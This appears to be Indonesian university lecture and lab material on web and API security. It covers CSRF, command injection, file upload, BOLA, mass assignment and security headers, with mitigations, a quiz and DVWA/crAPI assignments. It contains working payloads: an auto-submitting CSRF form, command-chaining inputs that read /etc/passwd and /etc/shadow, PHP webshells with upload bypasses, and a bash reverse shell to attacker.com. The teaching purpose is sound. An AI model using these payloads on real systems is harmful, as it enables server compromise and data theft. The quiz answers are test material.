CSRF

Cross-Site Request Forgery (CSRF)

Memaksa browser korban mengirimkan request berbahaya ke server yang dipercaya atas nama korban | CWE-352

Mekanisme Serangan CSRF

Alur Serangan CSRF

1. Korban login ke bank.com → browser simpan session cookie
2. Korban mengunjungi evil.com (link dari email/chat)
3. evil.com muat halaman dengan tag hidden:
<img src="https://bank.com/transfer?to=hacker&amount=9999999">
4. Browser korban secara otomatis kirim request ke bank.com beserta cookie
5. Bank.com proses transaksi karena request tampak sah!

<!-- CSRF HTML Form Attack (evil.com) --> <form action="https://target.com/change-email" method="POST" id="csrf-form"> <input type="hidden" name="email" value="hacker@evil.com"> </form> <script>document.getElementById('csrf-form').submit();</script> <!-- Auto-submit saat halaman dimuat -->

Mitigasi CSRF

1. CSRF Token (Synchronizer Token Pattern)

// Server generate token unik per session/request $token = bin2hex(random_bytes(32)); $_SESSION['csrf_token'] = $token; <!-- Embed di form --> <input type="hidden" name="csrf_token" value="<?php echo $token; ?>"> // Server validasi token di setiap POST request

2. SameSite Cookie Attribute

# Set-Cookie dengan SameSite=Strict atau Lax Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly # Strict: cookie tidak dikirim dari situs lain # Lax: izinkan top-level navigation GET saja
Double Submit Cookie Pattern

Kirim nilai CSRF token sebagai cookie DAN di body request. Server memverifikasi keduanya cocok. Efektif tanpa state server-side.

Injection Lanjutan

Command Injection & Unrestricted File Upload

Dua jalur menuju Remote Code Execution (RCE) yang paling merusak | CWE-77, CWE-434

OS Command Injection

Mekanisme & Payload

Aplikasi memasukkan input pengguna langsung ke perintah sistem OS:

# Kode PHP rentan (ping tool): $ip = $_GET['ip']; system("ping -c 4 $ip"); # Input attacker — command chaining: 127.0.0.1; id ← semicolon chain 127.0.0.1 && cat /etc/passwd ← AND chain 127.0.0.1 | whoami ← pipe chain 127.0.0.1 `id` ← backtick 127.0.0.1 $(cat /etc/shadow) ← subshell
Dampak RCE via Command Injection

Akses shell penuh pada server • Baca file sensitif (/etc/passwd, .env) • Pivoting ke sistem internal • Reverse shell ke attacker • Cryptomining • Ransomware deployment

Mitigasi Command Injection

Hindari pemanggilan shell langsung — gunakan library API. Jika tak bisa dihindari: whitelist input (hanya angka untuk IP), escapeshellarg(), atau sandboxing.

Unrestricted File Upload → RCE

Attack Chain: Upload → Webshell → RCE

# 1. Buat webshell PHP sederhana # File: shell.php <?php system($_GET['cmd']); ?> # 2. Upload ke aplikasi (bypass filter) shell.php ← tanpa filter shell.php.jpg ← MIME check lemah shell.pHp ← case mismatch shell.php%00.jpg ← null byte (PHP lama) # 3. Akses webshell via browser/curl curl "http://target.com/uploads/shell.php?cmd=id" uid=33(www-data) gid=33(www-data) groups=33(www-data) # 4. Upgrade ke reverse shell cmd=bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'

Mitigasi File Upload: Validasi MIME type server-side (bukan hanya extension) • Simpan di luar web root • Random filename • Antivirus scan • Nonaktifkan eksekusi di folder upload

API1 — Broken Object Level Authorization

BOLA — API Equivalent of IDOR

# Authenticated sebagai user A GET /api/v1/accounts/1001/transactions Authorization: Bearer [token-user-A] → 200 OK, data transaksi user A # Manipulasi ID → akses akun user B GET /api/v1/accounts/1002/transactions Authorization: Bearer [token-user-A] → 200 OK ← BOLA ditemukan! Harus 403!

API3 — Mass Assignment Attack

# POST /api/users/register — payload normal: {"username":"alice","password":"pass123"} # Mass assignment attack — tambahkan field admin: {"username":"alice","password":"pass123","role":"admin","isVerified":true} # Jika server tidak filter → user langsung jadi admin!
Pengujian API dengan Postman + Burp

Export collection Postman → import ke Burp Scanner. Systematic enumerate semua endpoint, ubah parameter ID, tambahkan field berbeda, uji authorization across user roles.

Defense in Depth

Security Headers — Lapisan Pertahanan di HTTP Response

HTTP response headers yang memperkuat keamanan browser dan mencegah serangan sisi klien

Header Keamanan Penting

Content-Security-Policy (CSP)

Mencegah XSS dengan membatasi sumber script, style, image yang boleh dimuat:

# Contoh CSP ketat — blokir inline script + external Content-Security-Policy: default-src 'self'; script-src 'self' cdn.trusted.com; style-src 'self' 'unsafe-inline'; img-src 'self' data:; object-src 'none'; frame-ancestors 'none';

HTTP Strict Transport Security (HSTS)

# Paksa browser gunakan HTTPS untuk 1 tahun Strict-Transport-Security: max-age=31536000; includeSubDomains; preload # max-age=31536000 = 1 tahun # includeSubDomains = berlaku ke semua subdomain # preload = daftarkan ke HSTS Preload List

X-Frame-Options

# Cegah clickjacking dengan memblokir iframe X-Frame-Options: DENY ← tidak bisa di-iframe X-Frame-Options: SAMEORIGIN ← hanya dari origin sama # Atau gunakan CSP: frame-ancestors 'none'

Header Lainnya & Analisis Dengan Tools

CORS — Cross-Origin Resource Sharing

# KONFIGURASI BERBAHAYA — izinkan semua origin: Access-Control-Allow-Origin: * Access-Control-Allow-Credentials: true # Kombinasi ini memungkinkan attacker baca response! # KONFIGURASI AMAN — whitelist explicit: Access-Control-Allow-Origin: https://trusted-app.com Access-Control-Allow-Credentials: true

Header Tambahan Penting

  • X-Content-Type-Options: nosniff — cegah MIME-sniffing
  • Referrer-Policy: strict-origin-when-cross-origin — kontrol Referer header
  • Permissions-Policy — batasi akses ke fitur browser (kamera, mikrofon)
# Analisis security headers dengan tools online/curl curl -I https://target.com | grep -iE "csp|hsts|x-frame|cors" # securityheaders.com — grading otomatis # Mozilla Observatory — scan mendalam curl "https://http-observatory.security.mozilla.org/api/v1/analyze?host=target.com"
CSP Bypass Techniques

Meski CSP aktif, ada bypass: unsafe-inline, CDN whitelisted dengan JSONP, nonce reuse. Gunakan csp-evaluator.withgoogle.com untuk evaluasi CSP Anda.

File Upload Attack di DVWA

# DVWA → File Upload (Security: Low) # Buat webshell: # shell.php <?php echo shell_exec($_GET['cmd']); ?> # Upload shell.php → server terima ../../hackable/uploads/shell.php succesfully uploaded! # Akses webshell via URL: curl "http://localhost:8888/dvwa/hackable/uploads/shell.php?cmd=id" uid=33(www-data) gid=33(www-data) # Medium security — bypass content-type check # Ubah Content-Type di Burp dari text/php ke image/jpeg Content-Type: image/jpeg ← spoofed header # High security — bypass extension check # Rename ke: shell.php.jpg dan manipulasi getimagesize()
Dampak Nyata

Webshell memberikan akses terminal penuh ke server. Attacker dapat membaca env variables, database credentials, lateral movement ke server lain dalam jaringan yang sama.

Autentikasi dan simpan token POST /user/login Body: {"email":"user@test.com","password":"Passw0rd!"} → Response: {"token": "eyJhbGci..."} # 3. Uji Mass Assignment & Rate Limiting

# Mass Assignment — tambahkan field sensitif PUT /user/profile { "name": "Alice", "email": "alice@test.com", "role": "admin", ← tambahan berbahaya "available_credit": 9999999 } # Jika server terima → mass assignment berhasil # Rate Limiting Test — kirim request cepat berulang for i in {1..50}; do curl -s -o /dev/null -w "%{http_code}" \ -X POST http://localhost:8888/user/login \ -d '{"email":"admin@test.com","password":"wrong"}'; done 200200200... → Tidak ada rate limiting = RENTAN 429429429... → Rate limiting aktif = AMAN # GraphQL Introspection — enumerate schema {"query": "{__schema{types{name}}}"} {"query": "{__schema{queryType{fields{name}}}}"}

Kuis Pertemuan 10 — Web Lanjutan & API Security

5 soal pilihan ganda · Sub-CPMK 263.1 & 263.2

Soal 1 dari 5
Seorang attacker membuat halaman web evil.com yang berisi form tersembunyi yang auto-submit ke https://bank.com/transfer?amount=9999&to=attacker. Korban yang sedang login di bank.com mengunjungi evil.com. Kerentanan apa yang dieksploitasi?
Benar! Ini adalah CSRF klasik — browser korban secara otomatis menyertakan cookie session bank.com saat mengirim request dari evil.com, membuatnya tampak seperti permintaan sah dari korban.
Kurang tepat. Ini CSRF — attacker memanfaatkan browser korban yang sudah login untuk mengirim request berbahaya ke situs yang dipercaya, bukan dengan menyuntikkan script (XSS).
Soal 2 dari 5
Sebuah aplikasi memiliki endpoint POST /api/users/register. Attacker mengirimkan body {"username":"hacker","password":"pass","role":"admin"} dan berhasil membuat akun dengan role admin. Ini adalah contoh dari…
Benar! Mass Assignment (API3) terjadi ketika API secara otomatis memetakan semua field dari request body ke objek model tanpa whitelist — attacker dapat menetapkan field sensitif seperti role, isAdmin, atau available_credit.
Kurang tepat. Ini adalah Mass Assignment — API3 dalam OWASP API Security. Server menerima semua property tanpa filter, sehingga attacker dapat menetapkan field sensitif yang seharusnya tidak dapat diubah.
Soal 3 dari 5
Manakah konfigurasi Content Security Policy yang paling efektif untuk mencegah Stored XSS dari skrip eksternal berbahaya?
Benar! script-src 'self' hanya mengizinkan script dari origin yang sama — memblokir script eksternal. object-src 'none' memblokir plugin berbahaya. Hindari 'unsafe-inline' karena justru memungkinkan XSS.
Kurang tepat. CSP yang efektif: script-src 'self' — hanya izinkan script dari origin sendiri. Opsi lain mengandung wildcard (*), unsafe-inline, atau unsafe-eval yang membuat CSP tidak efektif mencegah XSS.
Soal 4 dari 5
Seorang penguji menemukan bahwa aplikasi menjalankan perintah: ping -c 4 [user_input]. Input mana yang paling efektif untuk mengeksfiltrasi konten /etc/passwd?
Benar! Semicolon (;) memisahkan dua perintah shell. Setelah ping selesai, shell mengeksekusi cat /etc/passwd. Operator AND (&&) juga bisa dipakai, bergantung pada shell yang digunakan.
Kurang tepat. Untuk OS command injection, gunakan separator shell: semicolon (;) atau ampersand (&&). DROP TABLE adalah SQLi syntax, bukan command injection. OR dalam konteks ini tidak dikenali shell.
Soal 5 dari 5
Mitigasi yang paling tepat untuk serangan File Upload yang mengupload webshell PHP adalah…
Benar! Defense-in-depth untuk file upload: (1) Simpan di luar webroot — file tidak bisa diakses via URL, (2) Validasi MIME type real server-side bukan hanya extension, (3) Rename acak mencegah attacker menebak lokasi file, (4) Nonaktifkan eksekusi mencegah webshell berjalan.
Kurang tepat. Hanya memvalidasi ekstensi mudah di-bypass (Content-Type spoofing, null byte, double extension). Mitigasi lengkap: simpan di luar webroot + validasi MIME server-side + rename acak + nonaktifkan eksekusi di folder upload.

Tugas A — Lab Lanjutan DVWA

Selesaikan tiga lab berikut pada DVWA dan dokumentasikan dengan format laporan standar:

  • CSRF: Buat HTML file yang mengeksploitasi CSRF di DVWA. Dokumentasikan: form, payload, dan cara memverifikasi keberhasilan serangan.
  • Command Injection: Eksfiltrasi konten /etc/passwd dan /etc/hostname. Coba bypass filter di Security Level Medium.
  • File Upload: Upload webshell dan eksekusi minimal 2 perintah OS. Dokumentasikan bypass yang digunakan untuk Security Level Medium.
Kelompok (2 orang) Sub-CPMK 263.2 Bobot 15%

Tugas B — Laporan Pengujian API

Lakukan pengujian keamanan API pada OWASP crAPI (atau target lab yang disediakan) dan buat laporan pengujian API yang mencakup:

  • Minimal 3 kerentanan OWASP API Security Top 10 yang ditemukan
  • Setiap temuan: endpoint, parameter, payload, bukti screenshot, CVSS Score
  • Analisis mitigasi untuk setiap temuan
  • Security Headers analysis pada target (gunakan securityheaders.com)

Format: PDF max 15 halaman. Referensi: OWASP API Security Cheat Sheet.
